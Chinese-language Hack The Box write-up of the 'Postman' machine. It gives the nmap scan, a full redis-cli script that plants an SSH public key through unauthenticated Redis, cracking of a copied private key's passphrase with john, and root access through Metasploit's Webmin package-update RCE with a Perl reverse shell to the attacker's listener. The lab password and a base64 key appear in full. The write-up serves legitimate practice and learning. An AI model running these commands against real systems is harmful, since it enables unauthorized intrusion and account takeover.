---
layout:     post
title:      "Hackthebox Postman writeup/Walkthrough/攻略"
subtitle:   "Redis 未授权访问/Webmin CVE-2019-12840"
date:       2020-01-03 00:28:00
author:     "WuJ"
header-img: "img/post-bg-htb-postman.jpg"
tags:
    - HTB
    - 渗透测试
---

## 0x00 简介

- nmap 指令
- Redis 未授权访问
- Webmin CVE Package Updates

## 0x01 信息收集

nmap 对某一站点全面扫描 (**SYN全端口扫描**) 常用指令如下：

```shell
nmap -sS -sV -sC -T4 -v -p- 10.10.10.160
```

> **-sS:**  SYN扫描是目前默认的也是最受欢迎的扫描选项
>
> **-sV:** 版本探测，也可以用 -A 同时打开操作系统探测和版本探测。
>
> **-sC:** 使用默认脚本进行扫描
>
> **-T4:** 指定扫描过程中使用的时序(Timing)，共有6个级别(0-5)，级别越高，扫描速度越快，但也越容易被防火墙屏蔽。在网络通信状态良好的情况下推荐使用 T4.
>
> **-v:** 显示冗余信息，在扫描过程中显示扫描的细节
>
> **-p-:** 表示从端口1扫描到65535 
>
> **Other:** 扫描的时候按 `d` 可以显示 debug 信息，按 `x` 可以显示当前进度

```shell
root@kali:~# nmap -sS -sV -sC -T4 -v -p- 10.10.10.160
Starting Nmap 7.70 ( https://nmap.org ) at 2020-01-02 21:56 CST
Nmap scan report for Postman (10.10.10.160)
Host is up (0.15s latency).
Not shown: 49025 closed ports, 16506 filtered ports
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 46:83:4f:f1:38:61:c0:1c:74:cb:b5:d1:4a:68:4d:77 (RSA)
|   256 2d:8d:27:d2:df:15:1a:31:53:05:fb:ff:f0:62:26:89 (ECDSA)
|_  256 ca:7c:82:aa:5a:d3:72:ca:8b:8a:38:3a:80:41:a0:45 (ED25519)
80/tcp    open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: The Cyber Geek's Personal Website
6379/tcp  open  redis   Redis key-value store 4.0.9
10000/tcp open  http    MiniServ 1.910 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Nov 28 05:28:35 2019 -- 1 IP address (1 host up) scanned in 89.52 seconds
```

发现开放了4个端口， 80 端口在查看页面和扫描目录后未发现特别明显的漏洞，先继续看看后面两个端口。

## 0x02 Redis 未授权访问漏洞利用

发现 6379 端口运行着 Redis 服务，且版本较低，存在未授权访问漏洞，可以将本地 ssh 公钥写进远程靶机从而  getshell

exploit 如下：

```shll
#!/bin/bash
rm /root/.ssh/id*
ssh-keygen -t rsa

(echo -e "\n\n"; cat /root/.ssh/id_rsa.pub; echo -e "\n\n") > foo.txt

redis-cli -h 10.10.10.160 flushall
cat foo.txt | redis-cli -h 10.10.10.160 -x set crackit
redis-cli -h 10.10.10.160 config set dir /var/lib/redis/.ssh/
redis-cli -h 10.10.10.160 config set dbfilename "authorized_keys"
redis-cli -h 10.10.10.160 save

ssh -i /root/.ssh/id_rsa redis@10.10.10.160
```

具体说明：

1. 将本地 kali 的 ssh 公钥写进文本 foo 中，在其前后添加换行符 `\n` 为了避免和Redis里其他缓存数据混合

2. redis-cli `-x` 参数：代表从标准输入读取数据作为该命令的最后一个参数。

   例：`$echo "world" |redis-cli -x set hello` 等价于 `redis-cli set hello world` 

3. 该版本的 Redis 允许任意用户未授权访问并写文件，同时 Redis 在其默认目录下拥有 ssh 密钥并对其有写权限。这导致攻击者可以用自己的公钥覆盖原文件，实现远程登录。

4. 这里设定了 crackit 的键值为公钥，并通过 redis 命令变更 Redis DB 文件及存放地点为用户的 `.ssh` 文件夹，并将 `authorized_keys` 覆盖

   这样就可以成功的将自己的公钥写入 /.ssh 文件夹的 authotrized_keys 文件里，然后攻击者就可以直接用 ssh 免密登录

5. 因为靶机一直被所有人频繁修改和复写，一开始连接时需要使用 `flushall` 删除所有数据库中的所有key

   > [redis未授权访问利用](https://www.00theway.org/2017/03/27/redis_exp/)
   >
   > [Redis未授权访问漏洞利用](https://damit5.com/2018/05/18/Redis未授权访问漏洞利用/#写入SSH公钥直接连接)

**注意：**

在试图 `set key` 时，可能会爆出错误 `(error) READONLY You can't write against a read only slave.`

主要是因为所有人都在尝试攻破靶机，可能输入某些奇怪的命令使 redis 变成了从服务器，导致无法写入，需要使用 `SLAVEOF no one` 使其变回主服务器。

[SLAVEOF](https://xz.aliyun.com/t/5616#toc-3)

[Redis 主从复制常见问题](https://juejin.im/post/58d4e31aa22b9d00645634fc)

```
10.10.10.160:6379> set key "\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC5H80/PWYu0XeLVEQchqCtinGauFmpNPWJ//IkaeqceSE3YL6QeY33ipgkskpe1R/29jKhLJIkP0ku9ozPW9kIlz4HCDPm2C1V3tnaFAMz6P96HBGrd1XDa0cTjOkOgkeAW/YW0STn3pfjAUYXd3pIkQiD1zgkYvs2Y/Jkk+8BZ9+9nmSQkX7ic4jCwBF+HVlg4uGqK/McInB/LWNhnonRuQ0mx/IG2nSmWTX+EoFmWGyY8r2ODRr8MkxX5s9eBqhR94EiArsatHHN+Z2jWA8QhGqXliE/uQtXN42fU8P8G+VqpsADu8ZnblvTfSsVptSe0Fs6V63J1AUike9G1ejH root@kali\n\n"
(error) READONLY You can't write against a read only slave.
10.10.10.160:6379> SLAVEOF no one
OK
10.10.10.160:6379> set key "\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC5H80/PWYu0XeLVEQchqCtinGauFmpNPWJ//IkaeqceSE3YL6QeY33ipgkskpe1R/29jKhLJIkP0ku9ozPW9kIlz4HCDPm2C1V3tnaFAMz6P96HBGrd1XDa0cTjOkOgkeAW/YW0STn3pfjAUYXd3pIkQiD1zgkYvs2Y/Jkk+8BZ9+9nmSQkX7ic4jCwBF+HVlg4uGqK/McInB/LWNhnonRuQ0mx/IG2nSmWTX+EoFmWGyY8r2ODRr8MkxX5s9eBqhR94EiArsatHHN+Z2jWA8QhGqXliE/uQtXN42fU8P8G+VqpsADu8ZnblvTfSsVptSe0Fs6V63J1AUike9G1ejH root@kali\n\n"
OK
(0.95s)
```

## 0x03 User.txt

拿到 redis 的低权限 shell 后，在 `/home` 目录下发现用户 Matt，`su Mutt` 尝试切换发现需要密码。在 `.bash_history` 文件中发现存在 `id_rsa_bak`，因此遍历各个关键目录查找线索，在 `/var/opt` 下发现 `ida_rsa.bak` 文件，应该是 Matt 的 ssh 私钥，下面开始爆破。

![Xnip2020-01-05_22-44-39](https://tva1.sinaimg.cn/large/006tNbRwgy1gam2ib83kzj316g0u048k.jpg)

通过 `base64` 和 `base64 -d` 将文件拷贝到本地 kali，命名为 Mattssh_bak

```shell
redis@Postman:/var$ cd /opt
redis@Postman:/opt$ ls
id_rsa.bak
redis@Postman:/opt$ base64 id_rsa.bak 
LS0tLS1CRUdJTiBSU0EgUFJJVkFURSBLRVktLS0tLQpQcm9jLVR5cGU6IDQsRU5DUllQVEVECkRF
Sy1JbmZvOiBERVMtRURFMy1DQkMsNzNFOUNFRkJDQ0Y1Mjg3QwoKSmVoQTUxSTE3cnNDT09WcXlX
eCtDODM2M0lPQllYUTExRGR3L3ByM0wyQTJORHRCN3R2c1hOeXFLRGdoZlFuWApjd0dKSlVEOWtL
Sm5pSmtKenJ2RjFXZXB2TU5rajlaSXRYUXpZTjh3Ympscmt1MWJKcTV4bkpYOUVVYjVJN2syCjdH
c1R3c012S3pYa2tmRVpRYVhLL1Q1MHMzSTRDZGNmYnIxZFhJeWFiWExMcFpPaVpFS3ZyNCtLeVNq
cDRvdTYKY2RuQ1doemtBL1R3SnBYRzFXZU9tTXZ0Q1pXMUhDQnV0WXNOUDZCRGY3OGJRR21tbGly
cVJtWGZMQjkySmhUOQoxdThKekhDSjF6Wk1HNXZhVXR2b24wcWdQeDd4ZUlVTzZMQUZUb3pyTjlN
R1dFcUJFSjV6TVZycnQzVEdWa2N2CkV5dmxXd2tzN1IvZ2p4SHlVd1QrYTVMQ0dHU2pWRDg1THhZ
dXRnV3hPVUtidFdHQmJVOHlpN1lzWGxLQ3d3SFAKVUg3T2ZRejAzVld5K0swYWE4UXMrRXl3Nlgz
d2JXbnVlMDNuZy9zTEpuSjcyOXpiM2t1eW04citoVSs5djZWWQpTaitRbmpWVFlqRGZuVDIyakpC
VUhUVjJ5cktlQXo2Q1hkRlQreEloeEVBaXYwbTFaa2t5UWtXcFVpQ3p5dVlLCnQrTVN0d1d0U3Qw
Vko0VTFOYTJHM3hHUGptcmttandYdnVkS0MwWU4vT0JvUFBPVGFCVkQ5aTZmc29aNnB3blMKNU1p
OEJ6ckJoZE8wd0hhRGNUWVBjM0IwMEN3cUFWNU1YbWtBazJ6S0wwVzJ0ZFZZa3NLd3hLQ3dHbVds
cGRrZQpQMkpHbHA5TFdFZXJNZm9sYmpUU09VNW1EZVBmTVEzZndDTzZNUEJpcXpyckZjUE5Kcjcv
TWNRRUNiNXNmK082CmpLRTNKZm4wVVZFMlFWZFZLM29FTDZEeWFCZi9XMmQvM1Q3cTEwVWQ3Sys0
S2QzNmd4TUJmMzNFYTYrcXgzR2UKU2JKSWhrc3c1VEtoZDUwNUFpVUgyVG44OXFOR2VjVkpFYmpL
ZUovdkZaQzVZSXNRKzlzbDg5VG1KSEw3NFkzaQpsM1lYREVzUWpoWkh4WDVYL1JVMDJEK0FGMDdw
M0JTUmpoRDMwY2pqMHV1V2tLb3dwb28wWTBlYmxnbWQ3bzJYCjBWSVdyc2tQSzRJN0lINWdia3J4
VkdiLzlnL1cydWExQzNObmN2M01OY2YwbmxJMTE3QlMvUXdOdHVUb3pHOHAKUzlrM2xpK3JZcjZm
M21hL1VMc1VuS2labHM4U3BVK1JzYW9zTEdLWjZwMm9JZThvUlNtbE9Dc1kwSUNxN2VSUgpoa3V6
VXVIOXovbUJvMnRRV2g4cXZUb0NTRWpnOHlOTzl6OCtMZG9OMXdRV01QYVZ3UkJqSXl4Q1BIRlRK
M3UrClp4eTB0SVB3akNadnhVZlluL0s0RlZIYXZ2QStiOWxvcG5VQ0VBRVJwd0l2OCt0WW9md0dW
cExWQzBEck41OFYKWFRmQjJYOXNMMW9CM2hPNG1KRjBaM3lKMktaRWRZd0hHdXFOVEZhZ04wZ0Jj
eU5JMndzeFpOeklLMjZ2UHJPRApiNkJjOVVkaVdDWnFNS1V4NGFNVExoRzVST2pnUUd5dFdmL3E3
TUdyTzNjRjI1azFQRVdOeVpNcVk0V1lzWlhpCldoUUZIa0ZPSU53VkVPdEhha1ovVG9ZYVVRTnRS
VDZwWnlIZ3ZqVDBtVG8wdDNqVUVSc3BwajFwd2JnZ0NHbWgKS1RrbWhLK01UYW95ODlDZzBYdzJK
MThEbTBvNzhwNlVOcmtTdWUxQ3NXakVmRUlGM05BTUVVMm8rTmdxOTJIbQpucEFGUmV0dndRN3h1
a2swcmJiNm12RjhnU3FMUWc3V3BiWkZ5dGdTMDVUcFBaUE0waDh0UkU4WVJkSmhlV3JRClZjTnla
SDhPSFlxRVM0ZzJVRjYyS3B0dHFTd0xpaUY0dXRIcSsvaDVDUXdzRitKUmc4OGJueGgyejJCRDZp
NVcKWCtoSzVIUHBwNlFualo4QTVFUnVVRUdhWkJFVXZHSnRQR0hqWnlMcGt5dE1oVGphT3JSTll3
PT0KLS0tLS1FTkQgUlNBIFBSSVZBVEUgS0VZLS0tLS0K
```

```shell
root@kali:~/Desktop/ echo -n "LS0tLS1CRUdJTiBSU0EgUFJJVkFURSBLRVktLS0tLQpQcm9jLVR5cGU6IDQsRU5DUllQVEVECkRFSy1JbmZvOiBERVMtRURFMy1DQkMsNzNFOUNFRkJDQ0Y1Mjg3QwoKSmVoQTUxSTE3cnNDT09WcXlXeCtDODM2M0lPQllYUTExRGR3L3ByM0wyQTJORHRCN3R2c1hOeXFLRGdoZlFuWApjd0dKSlVEOWtLSm5pSmtKenJ2RjFXZXB2TU5rajlaSXRYUXpZTjh3Ympscmt1MWJKcTV4bkpYOUVVYjVJN2syCjdHc1R3c012S3pYa2tmRVpRYVhLL1Q1MHMzSTRDZGNmYnIxZFhJeWFiWExMcFpPaVpFS3ZyNCtLeVNqcDRvdTYKY2RuQ1doemtBL1R3SnBYRzFXZU9tTXZ0Q1pXMUhDQnV0WXNOUDZCRGY3OGJRR21tbGlycVJtWGZMQjkySmhUOQoxdThKekhDSjF6Wk1HNXZhVXR2b24wcWdQeDd4ZUlVTzZMQUZUb3pyTjlNR1dFcUJFSjV6TVZycnQzVEdWa2N2CkV5dmxXd2tzN1IvZ2p4SHlVd1QrYTVMQ0dHU2pWRDg1THhZdXRnV3hPVUtidFdHQmJVOHlpN1lzWGxLQ3d3SFAKVUg3T2ZRejAzVld5K0swYWE4UXMrRXl3Nlgzd2JXbnVlMDNuZy9zTEpuSjcyOXpiM2t1eW04citoVSs5djZWWQpTaitRbmpWVFlqRGZuVDIyakpCVUhUVjJ5cktlQXo2Q1hkRlQreEloeEVBaXYwbTFaa2t5UWtXcFVpQ3p5dVlLCnQrTVN0d1d0U3QwVko0VTFOYTJHM3hHUGptcmttandYdnVkS0MwWU4vT0JvUFBPVGFCVkQ5aTZmc29aNnB3blMKNU1pOEJ6ckJoZE8wd0hhRGNUWVBjM0IwMEN3cUFWNU1YbWtBazJ6S0wwVzJ0ZFZZa3NLd3hLQ3dHbVdscGRrZQpQMkpHbHA5TFdFZXJNZm9sYmpUU09VNW1EZVBmTVEzZndDTzZNUEJpcXpyckZjUE5KcjcvTWNRRUNiNXNmK082CmpLRTNKZm4wVVZFMlFWZFZLM29FTDZEeWFCZi9XMmQvM1Q3cTEwVWQ3Sys0S2QzNmd4TUJmMzNFYTYrcXgzR2UKU2JKSWhrc3c1VEtoZDUwNUFpVUgyVG44OXFOR2VjVkpFYmpLZUovdkZaQzVZSXNRKzlzbDg5VG1KSEw3NFkzaQpsM1lYREVzUWpoWkh4WDVYL1JVMDJEK0FGMDdwM0JTUmpoRDMwY2pqMHV1V2tLb3dwb28wWTBlYmxnbWQ3bzJYCjBWSVdyc2tQSzRJN0lINWdia3J4VkdiLzlnL1cydWExQzNObmN2M01OY2YwbmxJMTE3QlMvUXdOdHVUb3pHOHAKUzlrM2xpK3JZcjZmM21hL1VMc1VuS2labHM4U3BVK1JzYW9zTEdLWjZwMm9JZThvUlNtbE9Dc1kwSUNxN2VSUgpoa3V6VXVIOXovbUJvMnRRV2g4cXZUb0NTRWpnOHlOTzl6OCtMZG9OMXdRV01QYVZ3UkJqSXl4Q1BIRlRKM3UrClp4eTB0SVB3akNadnhVZlluL0s0RlZIYXZ2QStiOWxvcG5VQ0VBRVJwd0l2OCt0WW9md0dWcExWQzBEck41OFYKWFRmQjJYOXNMMW9CM2hPNG1KRjBaM3lKMktaRWRZd0hHdXFOVEZhZ04wZ0JjeU5JMndzeFpOeklLMjZ2UHJPRApiNkJjOVVkaVdDWnFNS1V4NGFNVExoRzVST2pnUUd5dFdmL3E3TUdyTzNjRjI1azFQRVdOeVpNcVk0V1lzWlhpCldoUUZIa0ZPSU53VkVPdEhha1ovVG9ZYVVRTnRSVDZwWnlIZ3ZqVDBtVG8wdDNqVUVSc3BwajFwd2JnZ0NHbWgKS1RrbWhLK01UYW95ODlDZzBYdzJKMThEbTBvNzhwNlVOcmtTdWUxQ3NXakVmRUlGM05BTUVVMm8rTmdxOTJIbQpucEFGUmV0dndRN3h1a2swcmJiNm12RjhnU3FMUWc3V3BiWkZ5dGdTMDVUcFBaUE0waDh0UkU4WVJkSmhlV3JRClZjTnlaSDhPSFlxRVM0ZzJVRjYyS3B0dHFTd0xpaUY0dXRIcSsvaDVDUXdzRitKUmc4OGJueGgyejJCRDZpNVcKWCtoSzVIUHBwNlFualo4QTVFUnVVRUdhWkJFVXZHSnRQR0hqWnlMcGt5dE1oVGphT3JSTll3PT0KLS0tLS1FTkQgUlNBIFBSSVZBVEUgS0VZLS0tLS0K" | base64 -d > Mattssh_bak 

```

和上一篇博客一样，之后在本机使用 ssh2john 将密钥转换为可破解的哈希格式，再使用 john 的自带字典进行 passphrase 的爆破

```shell
root@kali:~/home# ssh2john Mattssh_bak > matthash
root@kali:~/home# john --wordlist=/usr/share/wordlists/rockyou.txt matthash
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 1 for all loaded hashes
Cost 2 (iteration count) is 2 for all loaded hashes
Will run 4 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
computer2008     (Matts.key)
1g 0:00:00:01 10.16% (ETA: 04:52:13) 0.5319g/s 862502p/s 862502c/s 862502C/s kifra9..kieukieu
Session aborted
```

得到 ssh 的密钥 `computer2008`，但直接使用 ssh 无法成功登录，毕竟这是备份密钥，可能已经无法使用。但 `computer2008` 作为 Matt 的一个密码可能会被重用在别的地方。先登录 redis 用户，再切换用户，尝试将密码输入，bingo!

```shell
redis@Postman:~$ su Matt
Password: 
Matt@Postman:/var/lib/redis$ whoami
Matt
Matt@Postman:/var/lib/redis$ cd
Matt@Postman:~$ ls
user.txt
```

##  0x04 Root.txt

想起之前 10000 端口的 Webmin 服务，提示网站使用 SSL，将网址的 http 换成 https 即可。

![Xnip2020-01-05_21-25-59](https://tva1.sinaimg.cn/large/006tNbRwgy1gam0fmt3f1j31c00u0jzi.jpg)

使用 Matt 和 computer2008 尝试登录，登录成功，网站本身没有什么东西，再次注意到 Webmin 的版本，搜索是否存在相关 exploit。

![Xnip2020-01-05_21-26-19](https://tva1.sinaimg.cn/large/006tNbRwgy1gam0fxzn4yj31c00u0n54.jpg)

![Xnip2020-01-05_21-29-21](https://tva1.sinaimg.cn/large/006tNbRwgy1gam0gatz9fj31c00u0aon.jpg)

发现 msf 已经集成了针对该版本可利用的 exploit

```shell
msf5 > search webmin

Matching Modules
================

   #  Name                                         Disclosure Date  Rank       Check  Description
   -  ----                                         ---------------  ----       -----  -----------
   0  auxiliary/admin/webmin/edit_html_fileaccess  2012-09-06       normal     No     Webmin edit_html.cgi file Parameter Traversal Arbitrary File Access
   1  auxiliary/admin/webmin/file_disclosure       2006-06-30       normal     No     Webmin File Disclosure
   2  exploit/linux/http/webmin_packageup_rce      2019-05-16       excellent  Yes    Webmin Package Updates Remote Command Execution
   3  exploit/unix/webapp/webmin_backdoor          2019-08-10       excellent  Yes    Webmin password_change.cgi Backdoor
   4  exploit/unix/webapp/webmin_show_cgi_exec     2012-09-06       excellent  Yes    Webmin /file/show.cgi Remote Command Execution
   5  exploit/unix/webapp/webmin_upload_exec       2019-01-17       excellent  Yes    Webmin Upload Authenticated RCE


msf5 > use exploit/linux/http/webmin_packageup_rce

msf5 exploit(linux/http/webmin_packageup_rce) > show options 

Module options (exploit/linux/http/webmin_packageup_rce):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   PASSWORD   computer2008     yes       Webmin Password
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     10.10.10.160     yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      10000            yes       The target port (TCP)
   SSL        true             no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       Base path for Webmin application
   USERNAME   Matt             yes       Webmin Username
   VHOST                       no        HTTP server virtual host


Payload options (cmd/unix/reverse_perl):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.10.15.44      yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Webmin <= 1.910

```

设置好选项，注意 SSL 选项需要设置为 true

```shell
msf5 exploit(linux/http/webmin_packageup_rce) > run

[*] Started reverse TCP handler on 10.10.14.165:9004 
[+] Session cookie: 8269def18359f1629182b2d26b9f86ed
[*] Attempting to execute the payload...
[*] Command shell session 2 opened (10.10.14.165:9004 -> 10.10.10.160:41404) at 2019-11-28 05:12:27 -0500

whoami
root
id
uid=0(root) gid=0(root) groups=0(root)
ls
root.txt
```

## 0x05 Thanks！

也算是自己边学边记录，望大佬手下留情~









